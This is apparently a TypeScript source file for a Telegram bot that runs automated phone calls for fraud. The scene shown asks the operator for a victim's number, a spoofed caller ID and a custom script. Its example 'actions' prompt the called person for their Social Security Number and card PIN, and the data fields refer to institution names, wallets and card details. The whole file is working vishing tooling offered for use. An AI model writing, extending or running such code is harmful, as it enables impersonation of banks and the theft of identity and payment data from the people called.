import { Markup, Middleware } from 'telegraf';
import { C } from '../types';
import { UK_NUM, US_NUM } from '../utils/constants';
import { messagebirdMakeACall } from '../utils/messagebird';
import { validateNumber } from '../utils/validateNumber';

let chatId: number | undefined;

export const custom = (): Array<Middleware<C>> => [
  async (ctx) => {
    await ctx.replyWithHTML(
      `👍🏽 Awesome, Let's start\n\nReply with the number 📱\n(ex. ${
        Math.round(Math.random()) ? UK_NUM : US_NUM
      })\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ Custom ~</i></b>`,
      Markup.inlineKeyboard([Markup.button.callback('❌ Cancel', 'cancel')]),
    );
    ctx.wizard.state.callData = {};
    return ctx.wizard.next();
  },
  async (ctx) => {
    if (!ctx.message) {
      await ctx.reply(
        '🚫 Request expired, start again\n\n',
        Markup.inlineKeyboard([Markup.button.callback('Make a call', 'call')]),
      );

      return ctx.scene.leave();
    }

    // @ts-expect-error ts doesn't not recognise text on message
    if (!validateNumber(ctx.message.text)) {
      await ctx.replyWithHTML(
        `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>\n\n<b><i>~ Custom ~</i></b>`,
      );
      return;
    }
    await ctx.replyWithHTML(
      `Good,\n\nReply with your CUSTOM message. Please keep under 160 Characters.\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ Custom ~</i></b>`,
      Markup.inlineKeyboard([Markup.button.callback('❌ Cancel', 'cancel')]),
    );

    // @ts-expect-error ts doesn't not recognise state
    ctx.wizard.state.callData.number = ctx.message.text;

    return ctx.wizard.next();
  },
  async (ctx) => {
    await ctx.replyWithHTML(
      `Okay,\n\nReply with the caller ID 👤\n(e.g ${
        /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
          ctx.wizard.state.callData.number,
        )
          ? '448081961740'
          : '18882019292'
      })\n\n<i>***request will expire in 2 minutes***</i>\n\n<b><i>~ Custom ~</i></b>`,
      Markup.inlineKeyboard([Markup.button.callback('❌ Cancel', 'cancel')]),
    );

    // @ts-expect-error ts doesn't not recognise state
    ctx.wizard.state.callData.customMessage = ctx.message.text;
    return ctx.wizard.next();
  },
  async (ctx) => {
    // @ts-expect-error ts doesn't not recognise state
    if (!validateNumber(ctx.message.text)) {
      await ctx.replyWithHTML(
        `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>\n\n<b><i>~ Custom ~</i></b>`,
      );
      return;
    }

    await ctx.replyWithHTML(
      `Perfect, Reply with custom actions\n\ne.g SSN - Please enter your Social Security Number followed by the pound key.\n\nCard Pin - Please enter your card pin number followed by the pound key.\n\netc...\n\n <b>Please note the format MUST be the same or your call will fail</b>\n\n<b><i>~ Custom ~</i></b>`,
    );

    // @ts-expect-error ts doesn't not recognise state
    ctx.wizard.state.callData.callerId = ctx.message.text;
    return ctx.wizard.next();
  },
  async (ctx) => {
    if (!ctx.wizard.state.callData.actions) {
      // @ts-expect-error ts doesn't not recognise state
      ctx.wizard.state.callData.actions = ctx.message.text;
    }

    if (!ctx.wizard.state.callData) {
      return await ctx.reply(
        '🚫 Request expired, start again\n\n',
        Markup.inlineKeyboard([
          Markup.button.callback("🎬 Let's go", 'expired'),
        ]),
      );
    }

    const {
      number,
      institutionName,
      callerId,
      wallet,
      cardType,
      askCardInfo,
      transferNumber,
      pinType,
      actions,
      customMessage,
    } = ctx.wizard.state.callData;

    if (!actions) {
      await ctx.reply(
        'Please enter your actions in the format specified above.',
      );
      return;
    }

    let d;
    if (actions) {
      d = actions.split('\n\n').map((b: string) => {
        try {
          const c = b.split('-');
          if (c.length === 1) return;
          return {
            0: c[0].trim(),
            1: c[1].trim(),
          };
        } catch (error) {
          ctx.reply(
            'One or more of your actions are in the wrong format. Please fix and send again',
          );
        }
      });
    }

    await ctx.replyWithHTML(
      `Calling ${number}\nfrom ${callerId} with Custom Text 📲...\n\n<b><i>~ Custom ~</i></b>`,
    );

    chatId =
      Number(ctx.scene.state.chatId) ||
      ctx.chat?.id ||
      ctx.from?.id ||
      undefined;

    if (!chatId || chatId !== ctx.chat?.id || chatId !== ctx.from?.id) {
      return ctx.reply(
        '🚫 Request expired, start again\n\n',
        Markup.inlineKeyboard([Markup.button.callback('Make a call', 'call')]),
      );
    }

    await messagebirdMakeACall({
      from: callerId,
      to: number,
      institutionName,
      transferNumber,
      step: 'custom',
      wallet,
      cardType,
      askCardInfo,
      chatId,
      pinType,
      actions: JSON.stringify(d),
      customMessage,
      language: number[0] === `1` ? `en-us` : `en-gb`,
    });

    return ctx.wizard.next();
  },
];
